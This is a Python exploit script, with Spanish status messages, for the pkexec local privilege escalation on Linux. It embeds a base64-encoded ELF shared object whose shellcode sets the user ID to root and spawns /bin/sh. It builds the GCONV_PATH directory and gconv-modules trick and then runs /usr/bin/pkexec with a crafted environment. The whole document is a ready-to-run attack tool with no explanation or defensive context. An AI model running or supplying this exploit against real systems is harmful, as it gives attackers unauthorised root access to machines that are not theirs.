import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

payload_b64 = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''
payload = base64.b64decode(payload_b64)

environ = [
        b'exploit',
        b'PATH=GCONV_PATH=.',
        b'LC_MESSAGES=en_US.UTF-8',
        b'XAUTHORITY=../LOL',
        None
]

try:
    libc = CDLL(find_library('c'))
except:
    print(' [!] No se puede encontrar la biblioteca C' )
    sys.exit()

print(' [+] Iniciando el exploit ')
try:
    with open('payload.so', 'wb') as f:
        f.write(payload)
except:
    print(' [!] Error al crear el archivo payload.so ')
    sys.exit()
os.chmod('payload.so', 0o0755)

try:
    os.mkdir('GCONV_PATH=.')
except FileExistsError:
    print(' [-] El directorio GCONV_PATH=. ya existe, continuando... ')
except:
    print(' [!] Error al crear el directorio GCONV_PATH=. ')
    sys.exit()

try:
    with open('GCONV_PATH=./exploit', 'wb') as f:
        f.write(b'')
except:
    print(' [!] No se pudo crear el exploit ')
    sys.exit()
os.chmod('GCONV_PATH=./exploit', 0o0755)

try:
    os.mkdir('exploit')
except FileExistsError:
    print(' [-] El directorio del exploit ya existe, continuando... ')
except:
    print(' [!] Error al crear el directorio del exploit ')
    sys.exit()

try:
    with open('exploit/gconv-modules', 'wb') as f:
        f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
except:
    print(' [!] No se pudo crear el archivo de configuraci√≥n de gconf-modules ')
    sys.exit()

environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print(' [+] Exploit completado ')
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)